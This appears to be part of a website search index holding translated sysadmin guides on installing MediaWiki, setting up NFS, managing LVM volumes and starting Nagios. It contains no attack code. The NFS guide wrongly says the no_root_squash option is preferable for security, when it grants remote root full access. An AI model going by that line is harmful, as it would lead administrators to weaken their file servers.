                content: "Introduction linkA wiki is a content management system for websites that allows pages to be freely and equally editable by all authorized visitors. Wikis are used to facilitate collaborative document writing with minimal constraints. The wiki was invented by Ward Cunningham in 1995, for a section of a website on computer programming that he called WikiWikiWeb. The word “wiki” comes from the Hawaiian term wiki wiki, which means “fast” or “informal”. By the mid-2000s, wikis had reached a good level of maturity and are associated with Web 2.0. Created in 2001, Wikipedia has become the world’s most visited wiki.\nMediaWiki is a Wiki engine written in PHP and created by Magnus Manske. Initially developed for Wikipedia (which has been using it since 2002), it also serves as the foundation for other WikiMedia Foundation projects (Wiktionary, Wikisource, Wikibooks or Wikiquote). Other associations have adopted it (e.g., Wikitravel, Mozilla or Ekopedia).\nInstallation linkI’m describing here 2 ways to install Mediawiki. Choose the best for your needs, but I recommend the manual method.\nManual Method linkFirst of all, download the current version with git:\ngit clone https://gerrit.wikimedia.org/r/p/mediawiki/core.git Then list all versions:\ngit tag -l | sort -V And choose the wished version you want to use. Example, I want to use 1.21:\ngit checkout 1.21.0 Extensions install linkI strongly recommend as well to use git to get all your extensions. You don’t need to download all available as it takes some disk space, but you can choose them one by one like that:\ncd extensions git clone https://gerrit.wikimedia.org/r/p/mediawiki/extensions/.git You can see the names here: https://gerrit.wikimedia.org/r/#/admin/projects/\nDebian Method linkTo install from the Debian repository:\naptitude install mediawiki Alternatively, you can install it manually from the main site.\nPostgreSQL linkIf after installation you don’t want to use MySQL but Postgres as a database, you’ll certainly encounter some issues. Refer to this link and look at the FAQ. If it still doesn’t work, if you encounter other types of errors, then try this:\nIf you are using Postgres, you will need to either have a database and user created for you, or simply supply the name of a Postgres user with “superuser” privileges to the configuration form. Often, this is the database user named postgres.\nThe database that MediaWiki will use needs to have both plpgsql and tsearch2 installed. The installer script will try and install plpgsql, but you may need to install tsearch2 yourself. (tsearch2 is used for searching the text of your wiki). Here’s one way to do most of the setup. This is for a Unix-like system, and assumes that you have already installed the plpgsql and tsearch2 modules. In this example, we’ll create a database named wikidb, owned by a user named wikiuser. From the command-line, as the postgres user, perform the following steps.\ncreateuser -S -D -R -P -E wikiuser (then enter the password) createdb -O wikiuser wikidb createlang plpgsql wikidb Adding tsearch2 to the database is not a simple step, but hopefully it will already be done for you by whatever packaging process installed the tsearch2 module. In any case, the installer will let you know right away if it cannot find tsearch2.\nThe above steps are not all necessary, as the installer will try and do some of them for you if supplied with a superuser name and password.\nFor installing tsearch2 to the wikidb database under Windows, do the following steps:\nFind tsearch2.sql (probably under .\\PostgreSQL\\8.x\\share\\contrib) and copy it to the postgresql\\8.x\\bin directory; From a command prompt at the postgresql\\8.x\\bin directory, type: psql wikidb \u003c tsearch2.sql -U wikiuser It will prompt you for the password for wikiuser; That’s it!\nPoint (2) seems only to work on windows, because on debian linux 4.0 (etch) only user postgres is allowed to use language c. So there it must be called by:\nsu - postgres -c psql wikidb \u003c tsearch2.sql afterwards you must grant select rights to wikiuser to the tsearch tables and insert the correct locale.\nsu - postgres psql -d wikidb -c \"grant select on pg_ts_cfg to wikiuser;\" psql -d wikidb -c \"grant select on pg_ts_cfgmap to wikiuser;\" psql -d wikidb -c \"grant select on pg_ts_dict to wikiuser;\" psql -d wikidb -c \"grant select on pg_ts_parser to wikiuser;\" psql -d wikidb -c \"update pg_ts_cfg set locale = current_setting('lc_collate') where ts_name = 'default' and prs_name='default';\" If you receive an error similar to “ERROR: relation “pg_ts_cfg” does not exist” when executing the above statements, try installing tsearch2 to the wikidb database again, but instead use these two separate steps (and then try the grant statements again):\nsu - postgres psql wikidb -f tsearch2.sql Upgrade linkTo upgrade Mediawiki with git, go into your Mediawiki folder instance and check the version you’re running on:\n\u003e cd /var/www/mediawiki \u003e git describe --tags 1.21.0 Then get the latest version of Mediawiki:\ngit fetch Change your version to the desired version:\ngit checkout 1.21.1 and upgrade your instance with the database:\nphp maintenance/update.php That’s all, your MediaWiki core is now up to date. You now need look at extensions.\nExtensions upgrade linkTo upgrade you extensions, you’ve used git, that’s why it will be easy. Anyway, some of them may not be managed with git, but the old repository version (SVN). I’ve wrote a little script to handle that:\n#!/bin/sh extensions=`pwd` changes=0 for i in * ; do if [ -d $extensions/$i ] ; then echo \"\" echo \"[+] $i\" cd $extensions/$i # Git if [ -d .git ] ; then git pull changes=1 # SVN elif [ -d .svn ] ; then svn up changes=1 fi fi done # Reset rights if [ $changes -eq 1 ] ; then chown -Rf www-data. . fi Simply copy it in your extension directory and launch it from there:\n\u003e ./update_extensions.sh [+] CharInsert Already up-to-date. [+] Cite remote: Counting objects: 41, done remote: Finding sources: 100% (6/6) remote: Total 6 (delta 4), reused 6 (delta 4) Unpacking objects: 100% (6/6), done. From https://gerrit.wikimedia.org/r/p/mediawiki/extensions/Cite 22f4d9e..1e542ef master -\u003e origin/master Updating 22f4d9e..1e542ef Fast-forward Cite.i18n.php | 35 +++++++++++++++++++++++++++++++++++ 1 file changed, 35 insertions(+) [+] Gadgets Already up-to-date. [+] LdapAuthentication Already up-to-date. [+] MsUpload Already up-to-date. [+] MultiBoilerplate At revision 115794. [+] ParserFunctions Already up-to-date. [+] SyntaxHighlight_GeSHi Already up-to-date. [+] Vector Already up-to-date. [+] WikiEditor Already up-to-date. Everything is up to date now :-)\nConfiguration linkWeb Server linkNginx linkFor setting up Mediawiki with Nginx and short URLs, here is the configuration to adopt. I also added SSL and forced redirects from the login page to SSL:\nserver { include listen_port.conf; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name wiki.deimos.fr wiki.m.deimos.fr; root /usr/share/nginx/www/deimos.fr/blocnotesinfo; client_max_body_size 5m; client_body_timeout 60; access_log /var/log/nginx/wiki.deimos.fr_access.log; error_log /var/log/nginx/wiki.deimos.fr_error.log; location / { rewrite ^/$ $scheme://$host/index.php permanent; # Short URL redirect try_files $uri $uri/ @rewrite; } location @rewrite { if (!-f $request_filename){ rewrite ^/(.*)$ /index.php?title=$1\u0026$args; } } # Force SSL Login set $ssl_requested 0; if ($arg_title ~ Sp%C3%A9cial:Connexion) { set $ssl_requested 1; } if ($scheme = https) { set $ssl_requested 0; } if ($ssl_requested = 1) { return 301 https://$host$request_uri; } # Drop config include drop.conf; # Deny direct access to specific folders location ^~ /(maintenance|images)/ { return 403; } location ~ \\.php$ { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; } location = /_.gif { expires max; empty_gif; } location ^~ /cache/ { deny all; } location /dumps { root /usr/share/nginx/www/deimos.fr/blocnotesinfo/local; autoindex on; } # BEGIN W3TC Browser Cache gzip on; gzip_types text/css application/x-javascript text/x-component text/richtext image/svg+xml text/plain text/xsd text/xsl text/xml image/x-icon; location ~ \\.(css|js|htc)$ { expires 31536000s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } location ~ \\.(html|htm|rtf|rtx|svg|svgz|txt|xsd|xsl|xml)$ { expires 3600s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } location ~ \\.(asf|asx|wax|wmv|wmx|avi|bmp|class|divx|doc|docx|eot|exe|gif|gz|gzip|ico|jpg|jpeg|jpe|mdb|mid|midi|mov|qt|mp3|m4a|mp4|m4v|mpeg|mpg|mpe|mpp|otf|odb|odc|odf|odg|odp|ods|odt|ogg|pdf|png|pot|pps|ppt|pptx|ra|ram|svg|svgz|swf|tar|tif|tiff|ttf|ttc|wav|wma|wri|xla|xls|xlsx|xlt|xlw|zip)$ { expires 31536000s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; try_files $uri $uri/ @rewrite; } # END W3TC Browser Cache } Left Menu (Sidebar) link To edit your menu on the left: Access the modifications via this link:\nhttps://wiki.deimos.fr/index.php?title=MediaWiki:Sidebar Then, you can edit it by putting “link|name”\nHere’s an example:\n* navigation ** mainpage|mainpage ** portal-url|portal ** currentevents-url|currentevents ** recentchanges-url|recentchanges ** randompage-url|randompage ** helppage|help ** sitesupport-url|sitesupport * quick navigation ** linux|Linux ** unix|Unix ** Mac OS X|Mac OS X ** windows|Windows ** serveurs|Servers ** réseaux|Networks ** divers|Miscellaneous To create an interwiki link: [[Mylink#Interwiki|The name I want to give]]\nOne instance, multiple wikis (multi-tenant / wiki-family) linkMethod 1 linkIf for example you want to do multi-languages or simply have multiple databases and not make n updates for each of your bases, then opt for this solution.\nThe goal is to modify the code of the LocalSettings.php file in order to be able to detect in the http header (URL), a succession of characters that can refer to one base or another.\nProceed like this:\nRun a wiki setup. Once the LocalSettings.php file is created, rename it to fr.php for example. Run another wiki setup. Once the LocalSettings.php file is created, rename it to en.php for example. Create the LocalSettings.php file, then insert and adapt the following: \u003c?php $callingurl = strtolower($_SERVER['SERVER_NAME']); // identify the asking url if ( $callingurl == \"fr.deimos.fr\" ) { require_once( 'fr.php' ); } if ( $callingurl == \"en.deimos.fr\" ) { require_once( 'en.php' ); } ?\u003e In this configuration, if the url corresponds to http://fr.deimos.fr/mediawiki/index.php, for example, then the fr.php file will be taken into account.\nMethod 2 linkHere is another method that allows you to choose a different configuration file depending on the first parameter following the url. Example:\nhttp://www.deimos.fr/wiki1 http://www.deimos.fr/wiki2 http://www.deimos.fr/wiki3 … Modify the LocalSettings.php file:\n\u003c?php list($null, $toplevel, $dontcare) = explode('/', strtolower($_SERVER['REQUEST_URI'])); if (is_file(\"LocalSettings-$toplevel.php\")) { require_once(\"LocalSettings-$toplevel.php\"); } else { print \u003c\u003c"
            }
        );
    index.add(
            {
                id:  165 ,
                href: "\/NFS_:_Mise_en_place_d\u0027un_serveur_NFS\/",
                title: "NFS: Setting up an NFS Server",
                description: "Guide for setting up NFS server and client on different operating systems including Debian and Solaris.",
                content: "Introduction linkNetwork File System (NFS) is a protocol developed by Sun Microsystems that allows a computer to access files over a network.\nThis network file system allows sharing data primarily between UNIX systems. Implementations also exist for Macintosh and Microsoft Windows.\nNFS is compatible with IPv6 on most systems.\nSetting up an NFS server can be useful in certain cases such as for a TFTP server or to avoid using Samba, which is essentially an emulated Windows layer.\nIn terms of performance, NFS is definitely the best option!\nInstallation linkDebian linkLet’s install it:\napt-get install nfs-common nfs-user-server Solaris linkNothing special to install except the NFS server itself :-).\nConfiguration linkDebian linkThe three main configuration files are /etc/exports, /etc/hosts.deny, and /etc/hosts.allow.\n/etc/exports linkThe /etc/exports file is very simple:\ndirectory machine1(option11,option12) machine2(option21,option22) For example:\n/home 192.168.0.10(rw) 192.168.0.25(ro) For those who don’t want any restrictions:\n/home (rw,sync) This means that machine 192.168.0.10 will be authorized to access our /home directory with read and write permissions (rw) and machine 192.168.0.25 will have read-only access (ro).\ndirectory: the server directory to share. machine: A comma-separated list of machines authorized to mount this directory (use IP addresses rather than names to avoid “DNS spoofing” problems). options: ro: This is the default value, read-only. rw: The machine has read/write access to the directory. no_root_squash: Access by the root user on the server is done under the root identity, rather than nobody (default) TO BE USED PREFERABLY FOR SECURITY MEASURES sync: only for NFS v2, Does not defer physical writes to the volume, increases reliability in case of improper unmounting. Version 3 has a commit-rollback mechanism so this option is not useful. soft: allows NFS not to constantly access to check if the resource is available An important point for proper operation: you must have the same group and user numbers on both machines. Systems exist to manage this, NIS (rather old) or LDAP (more recent). With few users, you can simply edit /etc/group and /etc/passwd to synchronize these numbers.\nIt is not recommended to export a DOS or VFAT system due to their lack of multi-user management; they are not designed to be shared with NFS.\n/etc/hosts.deny linkThe simplest approach is to deny everything and only authorize specific things:\nportmap:ALL lockd:ALL mountd:ALL rquotad:ALL statd:ALL For the hosts.deny and hosts.allow files, you don’t even need to fill them if you don’t want any restrictions.\n/etc/hosts.allow linkIn the same spirit, this would be:\nportmap:192.168.1.34 lockd:192.168.1.34 mountd:192.168.1.34 rquotad:192.168.1.34 statd:192.168.1.34 All that’s left is to restart the service:\n/etc/init.d/nfs-server start Solaris linkConfiguration Files are:\n/etc/dfs/dfstab lists the resources to share at boot time. /etc/nfs/nfslogd.conf defines the location of the configuration logs that are used for NFS server logging. /etc/dfs/sharetab lists local resources that are currently being shared by the NFS server. /etc/rmtab lists the file systems remotely mounted by NFS clients. Do not edit this file. /etc/nfs/nfslog.conf lists information defining the location of the configuration logs used for NFS server logging. dfstab link # Place share(1M) commands here for automatic execution # on entering init state 3. # # Issue the command 'svcadm enable network/nfs/server' to # run the NFS daemon processes and the share commands, after adding # the very first entry to this file. # # share [-F fstype] [-o options] [-d \"\"] [resource] # .e.g, # share -F nfs -o rw=engineering -d \"home dirs\" /export/home2 For example, if we want to share the folder /export/home/ in read-only mode:\nshare -o ro /export/home/ Daemons link mountd: handles file system mount requests from remote systems and provides access control. Not used in NFSv4. nfsmapid: is the NFS user and group ID mapping daemon, which is used with NFSv4. nfsd: handles client file system requests and is used with NFSv4. statd: works with the lockd daemon to provide crash recovery and functions for the lock manager. lockd: supports record locking operations on NFS files. nfslogd: provides operational logging for NFSv2 and v3. With the Solaris 10 OS and NFSv4, you need only two daemons to support NFS: nfsmapid and nfsd. The mountd and lockd daemons are integrated together, and nfsmapid and nfsd are supported in NFSv4 with port 2049, which improves support for NFS through a firewall.\nIf you want to use NFSv2 or v3 with the Solaris 10 OS, all daemons are supported.\nStarting and Stopping the NFS Server Service linkThe svc:/network/nfs/server service starts the NFS server daemons when the system enters run level 3.\nTo start the NFS server daemon manually, run this command:\nsvcadm enable svc:/network/nfs/server To stop the NFS server daemon manually, run this command:\nsvcadm disable svc:/network/nfs/server Checking NFS Dependencies linkCheck dependencies using the svcs command:\nsvcs | grep nfs svcs -l nfs/server NFS Server Commands link shareall: reads and executes statements from /etc/dfs/dfstab. shares: makes a local directory on the NFS server available for mounting. dfshares: when used without any arguments, displays resources currently being shared. dfmount: displays a list of NFS server directories that are currently mounted. unshare: makes file resources unavailable for mounting. Configuring the NFS Server for Sharing linkSyntax:\n# share [-F ] [-o ] [] where: * -F specifies the file system type. * -o specifies the options that control access to the shared resource, for example read-only access. * specifies the absolute path name of the resource for sharing. For example, if you want to share the /export/home/ directory, make an entry like the following in the /etc/dfs/dfstab file:\nshare -F nfs -o ro /export/home/ In this example, -F specifies an NFS file system, -o ro specifies that access to the share is read-only, and /export/home/ is the absolute path of the share.\nSimilarly, by using the -o rw option, you can specify that is shared as read/write to all clients, and you can use -o root= to enable root privileges for the directory.\nMaking File Resources Unavailable for Mounting linkSyntax:\nunshare [-F ] [] For example:\nunshare -F nfs /export/home/ Client linkDebian linkTo connect, it’s super simple:\nmount @IP:/my/share my_mount_point Solaris linkMounting a Remote File System linkSyntax:\nmount [-F ] [-o ] : [] For example:\nmount -F nfs -o ro gladiator:/export/home/ /mymountpoint where: * Gladiator: is the name of the remote server. * /export/home/: is the remote file resource. * /mymountpoint: is the mount point where /export/home/ is shared. Another example:\nmount -o ro Gladiator,Sun,Moon:/Central_data /mymountpoint In the second example, if the Gladiator system is unavailable, then the request will flow to the second system, which is called Sun, and so on.\nUnmounting Remote File Systems From a Client linkSyntax:\numount [] For example:\numount /mymountpoint Mounting Remote Resources at Boot Time linkTo mount a remote file system at boot time, make an entry in /etc/vfstab.\nFor example, add the following entry in the /etc/dfstab file:\nGladiator:/export/home/ - /mymountpoint nfs - yes bg where: * device to mount is Gladiator:/export/home/ * device to fsck is - * mount point is /mymountpoint * FS type is nfs * fsck pass is - * mount at boot is yes * mount options is bg (for background) Checks linkIf you want to check what kind of share is being offered by a server, you can use this command:\nshowmount -e servernfs_ip_or_fqdn FAQ linkmount(2): Protocol not supported linkIf you encounter this kind of issue while trying to mount a share on a client side:\nmount.nfs: mount(2): Protocol not supported mount.nfs: trying text-based options 'udp,sec=sys,rsize=8192,wsize=8192,intr,hard,addr=10.0.0.1' mount.nfs: prog 100003, trying vers=3, prot=17 mount.nfs: trying 10.0.0.1 prog 100003 vers 3 prot UDP port 2049 mount.nfs: prog 100005, trying vers=3, prot=17 mount.nfs: trying 10.0.0.1 prog 100005 vers 3 prot UDP port 54874 That means you still have an active connection on the server side. You can see it with the showmount command:\nshowmount -a 10.0.0.238:/mnt/nfs/dev/image_cache 10.0.0.238:/mnt/nfs/dev/image_upload 10.0.0.238:/mnt/nfs/dev/shared 10.0.0.238:/mnt/nfs/dev/templates 10.0.0.238:/mnt/nfs/dev/xmlcache To be able to remount the mount point, run this kind of command still on the server side:\nexportfs -u 10.0.0.238:/mnt/nfs/dev/xmlcache Then try to remount and it will work.\nResources linkSetting Up An NFS Server And Client\nhttp://www.sun.com/bigadmin/content/submitted/fundamentals_nfs.jsp\nSetting Up An NFS Server And Client On Debian Lenny\n"
            }
        );
    index.add(
            {
                id:  166 ,
                href: "\/LVM_:_Utilisation_des_LVM\/",
                title: "LVM: Working with Logical Volume Management",
                description: "How to create, manage, and optimize logical volumes on Linux systems using LVM for flexible storage management",
                content: "Introduction linkLogical Volume Management (LVM) is a method and software for partitioning, concatenating, and utilizing storage spaces on a server. It allows flexible management, security, and online optimization of storage spaces in UNIX/Linux-type operating systems.\nWe also refer to it as Volume Manager.\nSince LVM is not very simple to use, and since I don’t handle it every day either, I thought a small documentation was essential. I’ll fill it in as needed.\nHere are the main files and folders used by LVM:\nFile/Folder Description /etc/lvm/lvm.conf LVM configuration file /etc/lvm/cache.cache Device name cache file /etc/lvm/backup Folder containing automatic backups of VG metadata /etc/lvm/archive Folder containing automatic archives of VG metadata /var/lock/lvm Lock file to prevent simultaneous execution of multiple LVM tools, avoiding metadata corruption Creating a Partition linkWhen you use fdisk to create a partition and assign it as LVM, it may not appear in the devices. To avoid rebooting to see it, simply run this command on the disk in question (sda for example):\npartx -a /dev/sda If you then need to add it to the fstab, it’s preferable to use UUIDs. To locate them, there’s a command:\n$ blkid blkid/dev/sda1: UUID=\"fd292b5c-091f-4a2f-b694-7d881e2eaa54\" TYPE=\"ext4\" /dev/sda2: UUID=\"a4ljAA-KRHZ-sSHH-E4yy-tKmc-ZsHF-Scrc2N\" TYPE=\"LVM2_member\" /dev/mapper/vg_redhatsrv1-lv_root: UUID=\"74706659-f76e-4dd3-8f93-b3629923d356\" TYPE=\"ext4\" /dev/mapper/vg_redhatsrv1-lv_swap: UUID=\"c02b0c7b-88b3-4521-820f-a42c27871e35\" TYPE=\"swap\" /dev/sdb1: UUID=\"c7b14f0b-1ccd-40f8-8183-7e85cbcb9d64\" TYPE=\"crypto_LUKS\" All you have to do is add a line like this to the fstab (/etc/fstab):\nUUID=fd292b5c-091f-4a2f-b694-7d881e2eaa54 /mnt ext4 defaults 0 0 Usage linkActivating an LVM Partition linkTo activate an LVM partition, we’ll use pvcreate:\npvcreate /dev/sda1 You can then see the status with the pvdisplay command.\nCreating a Volume Group linkWe must then create a VG if we want to be able to create volumes:\nvgcreate my_vg /dev/sda1 You should put the name of the VG you want here instead of ‘my_vg’.\nCreating Volumes linkTo create volumes:\nlvcreate -n my_lv1 -L 5G my_vg So you need:\nmy_lv1: the desired LV name -L 5G: the volume group size my_vg: the name of the VG on which the LV should be stored. Resizing linkChange block storage size (optional) linkYou may need to update the partition block size after updating the partition table. First get growpart:\napt-get install cloud-utils Now get the partition table:\n$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS sda 8:0 0 300G 0 disk ├─sda1 8:1 0 512M 0 part /boot/efi ├─sda2 8:2 0 488M 0 part /boot └─sda3 8:3 0 299G 0 part ├─vg-root 254:0 0 74.5G 0 lvm / └─vg-longhorn 254:1 0 200G 0 lvm /mnt/longhorn sr0 11:0 1 633M 0 rom sr1 11:1 1 1024M 0 rom Then run the following command to resize the partition (3 in this case):\nsudo growpart /dev/sda 3 This command will resize the third partition on the /dev/sda disk. You can change the partition number and disk name as needed.\nIncreasing Size linkTo increase the size of a partition:\nlvextend -L +10G /dev/mapper/my_partition Then you just need to resize the filesystem (xfs_grow for example for XFS)\nReducing Size linkDecreasing the size of a filesystem is a bit more delicate. Indeed, if you make the mistake of decreasing the size of the logical volume before reducing the content size (the filesystem itself), then you destroy your filesystem… same if you reduce the logical volume size too much.\nTo avoid any risk, I recommend using the following method (a bit longer than normal, but much more reliable):\nReduce the filesystem size more than necessary Reduce the logical volume size to give it exactly the new desired size. Enlarge the filesystem so that it occupies all available space. This way, the risk of error is much lower.\nReducing the FS linkIf you don’t want to do this operation manually, use a live CD with gparted included.\nCaution, not all filesystems can be “reduced”. For ext3 and reiserfs, it works very well. Here’s an example with reiserfs…\ndf -h In this example, the “ca” volume is in the volume group svg. On this logical volume exists a reiserfs filesystem of 512 MB size. However, I only use 230 MB. Moreover, I know I’ll never add anything to this volume. So I want to decrease its size to 256 MB (to leave a safety margin, and because it makes a round number ;) I start by unmounting the filesystem:\numount /home/ca Then I will reduce the size of the filesystem, more than necessary. Rather than remove 256 MB, I’ll remove 258. I can do this because there’s 283 MB free… Obviously, removing more space than remains would be suicidal…\nresize_reiserfs -s -258M /dev/svg/ca CAUTION: If you’re using ext3, you can’t indicate the amount of space to remove, you must give the final desired size (512-258). The right command would have been:\nresize2fs -p /dev/svg/ca 254M It’s possible that it asks you to run this command before. If that’s the case, do it:\ne2fsck -f /dev/svg/ca Reducing the LV linkIn case you don’t see the LV in /dev/mapper, you’ll need to activate it:\nlvchange -a y /dev/svg/ca Note: to deactivate an LV, change the “y” to “n”.\nNow that the filesystem has decreased, we need to give the logical volume its new size, 256 MB instead of 512:\nlvresize -L -256M /dev/svg/ca WARNING: Reducing active logical volume to 256.00 MB THIS MAY DESTROY YOUR DATA (filesystem etc.) Do you really want to reduce ca? [y/n]: y Reducing logical volume ca to 256.00 MB Just one last step, we tell the filesystem that it can automatically expand to take all available space. It should therefore be able to grow by 2 MB. It will find the exact size in blocks etc. on its own… We didn’t take the risk of making an error by reducing it “exactly” to the same size as the logical volume, because the slightest error could have corrupted the filesystem by a few blocks.\nresize_reiserfs /dev/svg/ca or, if you’re using ext3:\nresize2fs /dev/svg/ca All that’s left is to remount the filesystem:\n$ mount /dev/svg/ca /home/ca $ df -h | grep ca /dev/mapper/svg-ca 256M 230M 27M 90% /home/ca It’s done… The filesystem is now 256 MB, and we still have our 230 MB of data inside. Conclusion: Playing with the size of logical volumes works very well, you just have to take your time and not do anything silly :)\nVolume Recovery linkIf I’m in recovery mode, and I want to mount my filesystems, how do I do it?\nMake sure the module is properly loaded:\nmodprobe dm-mod Scan all LVMs:\nvgscan vgchange -ay And mount the LV:\nmkdir -p /mnt/VolGroup00/LogVol00 mount /dev/VolGroup00/LogVol00 /mnt/VolGroup00/LogVol00 Once finished, you can deactivate your volume:\nvgchange -an VolGroup00 Exporting/Importing a VG link You can completely unmount a volume group like this: vgexport This will ensure that nothing is mounted and active on your machine.\nTo remount it, it’s quite simple: vgimport Then activate the vg to display the volumes:\nvgchange -ay Scanning New LVM Volumes linkYou can verify that there’s a new volume by scanning the PVs:\npvscan The new volumes will then appear.\nDisk Replacement linkIf you have a VG with multiple disks in it. One of them is defective and you’ve added its replacement to the VG. There is a hot solution to remove the defective disk from the VG without data loss:\npvmove /dev/ All that’s left is to remove the disk.\nControlling Volume Visibility linkYou can disable visibility of a volume like this:\nlvchange -an my_lv You can enable visibility of a volume this way:\nlvchange -ay my_lv You can force an lv to be read-only accessible:\nlvchange -pr my_lv Or writable:\nlvchange -pw my_lv Snapshot linkCreating a Snapshot linkTo create a snapshot of an existing LV:\nlvcreate -s -n datasnap -L +4G vgdata/lvdata Here I just created a 4G Snapshot.\nDeleting the Snapshot linkIf I’m satisfied with the changes made, I want to delete the snapshot:\nlvremove /dev/vgdata/datasnap Rolling Back Changes linkIf I’m not satisfied with the changes and want to roll back from the snapshot, I’ll need to unmount the partition and revert:\numount lvconvert --merge -v vgdata/datasnap lvchange -an /dev/vgdata/data lvchange -ay /dev/vgdata/data mount /dev/vgdata/data The old partition will be remounted at the right place.\nDumping the Configuration linkYou may need to dump the LVM configuration. To do this, run:\n$ lvm dumpconfig devices { dir=\"/dev\" scan=\"/dev\" obtain_device_list_from_udev=1 preferred_names=[\"^/dev/mpath/\", \"^/dev/mapper/mpath\", \"^/dev/[hs]d\"] filter=\"a/.*/\" cache_dir=\"/etc/lvm/cache\" cache_file_prefix=\"\" write_cache_state=1 sysfs_scan=1 md_component_detection=1 md_chunk_alignment=1 data_alignment_detection=1 data_alignment=0 data_alignment_offset_detection=1 ignore_suspended_devices=0 disable_after_error_count=0 require_restorefile_with_uuid=1 pv_min_size=2048 issue_discards=0 } dmeventd { mirror_library=\"libdevmapper-event-lvm2mirror.so\" ... Viewing Locks linkTo view current locks on LVMs, use this command:\n$ lvmdiskscan /dev/ram0 [ 16,00 MiB] /dev/root [ 2,81 GiB] /dev/ram1 [ 16,00 MiB] /dev/sda1 [ 200,00 MiB] /dev/ram2 [ 16,00 MiB] /dev/sda2 [ 1000,00 MiB] /dev/ram3 [ 16,00 MiB] /dev/sda3 [ 2,83 GiB] LVM physical volume ... /dev/ram13 [ 16,00 MiB] /dev/ram14 [ 16,00 MiB] /dev/ram15 [ 16,00 MiB] /dev/sdb [ 4,00 GiB] 2 disks 18 partitions 0 LVM physical volume whole disks 1 LVM physical volume Hot FSCK on ext3/4 linkYou’ve dreamed of it, right? It is indeed possible to do hot fsck thanks to LVM snapshots. Here’s a small script that allows scanning all ext3 and ext4 type LVs and defragmenting them (Note: You need 10% free space compared to the largest LV in your VGs):\n#!/bin/bash # Made by deimosfr # Inspired from https://www.redhat.com/archives/ext3-users/2008-January/msg00032.html EMAIL=xxx@mycompany.com # Get line by line IFS=$'\\n' for line in `lvs --unbuffered -o lv_name,vg_name,lv_size,vg_free --units m --noheadings --nosuffix`; do # Get informations on the device VOLUME=`echo $line | awk '{ print $1 }'` VG=`echo $line | awk '{ print $2 }'` LV_SIZE=`echo $line | awk '{ print $3 }' | sed 's/\\..*//g'` VG_FREE_SIZE=`echo $line | awk '{ print $4 }' | sed 's/\\..*//g'` SNAPSIZE=`echo $LV_SIZE | awk '{ printf(\"%s\\n\"), int($1*0.1) }'` # Check if 10% of the LV size is free on the VG if [ $SNAPSIZE -lt $VG_FREE_SIZE ]; then # Check if it is ext3 or ext4 LV_DEV=`echo ${VOLUME} | sed 's/\\-/--/'` if [ `mount | grep /dev/mapper/${VG}-${LV_DEV} | grep -c \"ext[3-4]\"` -ge 1 ]; then echo \"Analyzing ${VG}-${VOLUME}\" TMPFILE=`mktemp -t e2fsck_${VG}_${VOLUME}.log.XXXXXXXXXX` START=$(date +'%Y%m%d%H%M%S') # Create snapshot lvcreate -s -L ${SNAPSIZE} -n \"${VOLUME}-snap\" \"${VG}/${VOLUME}\" if nice logsave -as $TMPFILE e2fsck -p -C 0 \"/dev/${VG}/${VOLUME}-snap\" \u0026\u0026 nice logsave -as $TMPFILE e2fsck -fy -C 0 \"/dev/${VG}/${VOLUME}-snap\"; then # Set to 0 the fsck counter tune2fs -C 0 -T \"${START}\" \"/dev/${VG}/${VOLUME}\" else # Set the fsck counter at max to fsck next time and send an email tune2fs -C 16000 -T \"19000101\" \"/dev/${VG}/${VOLUME}\" if test -n \"EMAIL\"; then mail -s \"E2fsck of /dev/${VG}/${VOLUME} failed on host `hostname`!\" $EMAIL \u003c $TMPFILE fi fi # Merge / Remove snapshot lvremove -f \"${VG}/${VOLUME}-snap\" rm $TMPFILE fi fi done Having a Nice GUI linkWell, for LVM and Red Hat connoisseurs, you certainly know the system-config-lvm command. For Debian it would be cool if we could have it! And well, bibi got the solution:\nsudo apt-get install python-gtk2 python-gtk-1.2 python-glade-1.2 python-glade2 python-gnome2 wget http://download.fedora.redhat.com/pub/fedora/linux/core/updates/5/i386/system-config-lvm-1.0.18-1.2.FC5.noarch.rpm sudo alien system-config-lvm-1.0.18-1.2.FC5.noarch.rpm sudo dpkg -i system-config-lvm_1.0.18-2.2_all.deb sudo ln -s /usr/bin/python2.4 /usr/bin/python2 All that’s left is to launch and say “woooow”:\nsystem-config-lvm FAQ linkI Have a UUID Conflict linkIf you have the misfortune of running into a UUID conflict, you can regenerate one via the following command:\nuuidgen Resources linkDownload the LVM documentation\nDocumentation for beginners\nDocumentation on LVM Snapshots\n"
            }
        );
    index.add(
            {
                id:  167 ,
                href: "\/Nagios_:_Installation_et_configuration\/",
                title: "Nagios: Installation and Configuration",
                description: "A guide to install and configure Nagios monitoring system on Debian, including server setup, configuration options, and troubleshooting.",
                content: " Software version Nagios 3 Operating System Debian 6 Last Update 08/09/2014 Introduction linkNagios is a very powerful tool that allows you to test various services such as SMTP, PING, and many other things through plugins. It enables you to know if your platforms are still operational.\nIn short, it can alert you in different ways. Try it, you’ll see, it’s magical :-)\nInstallation linkThe installation is quite simple:\naptitude install nagios3 Configuration linkConfiguration, on the other hand, gets more complicated. You should know that Nagios is difficult to approach initially, but once you understand it, you save a lot of time and can deploy new services with ease.\napache2.conf linkThis is the standard Debian configuration for apache2. It allows you to access Nagios via http://server/nagios3. It’s up to you to modify the configuration or not:\n# apache configuration for nagios 3.x # note to users of nagios 1.x and 2.x: #\tthroughout this file are commented out sections which preserve #\tbackwards compatibility with bookmarks/config for older nagios versios. #\tsimply look for lines following \"nagios 1.x:\" and \"nagios 2.x\" comments. ScriptAlias /cgi-bin/nagios3 /usr/lib/cgi-bin/nagios3 ScriptAlias /nagios3/cgi-bin /usr/lib/cgi-bin/nagios3 # nagios 1.x: #ScriptAlias /cgi-bin/nagios /usr/lib/cgi-bin/nagios3 #ScriptAlias /nagios/cgi-bin /usr/lib/cgi-bin/nagios3 # nagios 2.x: #ScriptAlias 